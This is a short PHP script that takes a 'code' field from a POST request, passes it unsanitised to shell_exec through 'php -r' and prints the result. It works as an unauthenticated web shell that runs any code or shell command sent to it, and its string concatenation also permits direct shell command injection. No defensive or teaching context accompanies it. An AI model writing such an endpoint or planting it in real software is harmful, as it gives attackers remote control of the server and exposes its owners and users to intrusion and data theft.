<?php
    if (isset($_POST["code"])) {
        $code = $_POST["code"];
        $output = shell_exec("php -r '" . $code . "'");
        echo $output;
    } else {
        echo "Error: 'code' key not found in POST data";
    }
?>
